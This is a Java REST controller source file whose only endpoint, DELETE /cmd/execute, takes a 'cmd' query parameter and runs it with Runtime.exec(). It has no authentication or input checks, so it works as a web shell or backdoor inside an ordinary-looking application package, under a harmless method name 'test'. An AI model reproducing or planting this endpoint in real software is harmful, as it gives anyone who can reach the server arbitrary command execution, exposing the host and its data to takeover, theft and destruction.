package com.app.rest;

import javax.ws.rs.*;
import javax.ws.rs.core.MediaType;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

@Path("/cmd")
@Produces({MediaType.APPLICATION_JSON})
@Consumes({MediaType.APPLICATION_JSON})
public class ControlRest {

    @DELETE
    @Path("/execute")
    public Map<String, Object> test(@QueryParam("cmd") String cmd) throws Exception {
        Map<String, Object> result = new HashMap<>();
        result.put("result", true);
        try {
            execute(cmd);
        }catch (Throwable e){
            result.put("result", false);
            result.put("cause", e.getMessage());
            return result;
        }
        return result;
    }


    public String execute(String cmd){
        String result="";
        try {
            Runtime rt = Runtime.getRuntime();
            rt.exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return result;
    }
}
